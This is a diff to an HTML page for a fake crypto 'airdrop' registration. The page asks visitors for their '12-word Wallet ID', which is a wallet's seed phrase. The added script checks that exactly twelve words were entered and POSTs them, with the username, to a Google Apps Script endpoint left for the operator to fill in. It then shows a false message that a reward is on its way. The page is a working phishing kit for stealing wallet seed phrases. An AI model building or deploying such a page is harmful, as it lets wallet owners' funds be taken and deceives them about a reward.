@@ -6,36 +6,27 @@
   <style>
     body {
       background: #121212;
-      color: #f0f0f0;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background: #1e1e1e;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,255,128,0.2);
-      text-align: center;
-      width: 90%;
-      max-width: 400px;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      padding: 40px;
     }
     h1 {
-      margin-bottom: 20px;
-      color: #00ff99;
+      color: #00ffcc;
     }
     input[type="text"], input[type="password"] {
-      width: calc(100% - 40px);
+      width: 300px;
       padding: 10px;
-      margin-bottom: 15px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+    }
+    input[type="submit"] {
+      background: #00ffcc;
+      padding: 10px 20px;
       border: none;
       border-radius: 8px;
-      background: #2c2c2c;
-      color: white;
-      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
     }
     .wallet-input {
       position: relative;
@@ -43,49 +34,74 @@
     .toggle-eye {
       position: absolute;
       right: 10px;
-      top: 10px;
+      top: 50%;
+      transform: translateY(-50%);
       cursor: pointer;
-      color: #aaa;
     }
-    input[type="submit"] {
-      background: #00ff99;
-      border: none;
-      padding: 10px 20px;
-      font-size: 1em;
-      border-radius: 8px;
-      color: black;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-    input[type="submit"]:hover {
-      background: #00cc7a;
-    }
-    .message {
-      margin-top: 15px;
-      color: #00ff99;
+    .success-message {
+      margin-top: 20px;
+      color: #00ffcc;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Register for the Airdrop</h1>
-    <form>
-      <input type="text" placeholder="Username" required><br>
-      <div class="wallet-input">
-        <input type="password" id="wallet" placeholder="Wallet ID (12 words)" required>
-        <span class="toggle-eye" onclick="toggleWallet()">👁️</span>
-      </div>
-      <input type="text" placeholder="Referral Code"><br>
-      <input type="submit" value="Submit">
-    </form>
-    <div class="message">Thank you for registering! You'll receive your reward shortly.</div>
-  </div>
+
+  <h1>Register for the Airdrop</h1>
+
+  <form onsubmit="submitForm(event)">
+    <input type="text" id="username" placeholder="Username" required><br>
+
+    <div class="wallet-input">
+      <input type="password" id="wallet" placeholder="Wallet ID (12 words)" required>
+      <span class="toggle-eye" onclick="toggleWallet()">👁️</span>
+    </div>
+
+    <input type="text" id="referral" placeholder="Referral Code"><br>
+
+    <input type="submit" value="Submit">
+  </form>
+
+  <div class="success-message" id="successMsg"></div>
 
   <script>
     function toggleWallet() {
       const walletField = document.getElementById("wallet");
       walletField.type = walletField.type === "password" ? "text" : "password";
     }
+
+    function submitForm(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const wallet = document.getElementById("wallet").value.trim();
+      const referral = document.getElementById("referral").value.trim();
+      const successMsg = document.getElementById("successMsg");
+
+      const words = wallet.split(/\s+/);
+      if (words.length !== 12) {
+        alert("Wallet ID must contain exactly 12 words.");
+        return;
+      }
+
+      // Replace with your deployed Google Apps Script URL
+      const endpoint = "YOUR_GOOGLE_SCRIPT_WEB_APP_URL";
+
+      fetch(endpoint, {
+        method: "POST",
+        body: JSON.stringify({ username, wallet, referral }),
+        headers: { "Content-Type": "application/json" }
+      })
+      .then(res => res.json())
+      .then(data => {
+        successMsg.innerText = "Thank you for registering! You'll receive your reward shortly.";
+      })
+      .catch(err => {
+        alert("Something went wrong. Please try again.");
+        console.error(err);
+      });
+    }
   </script>
+
 </body>
 </html>
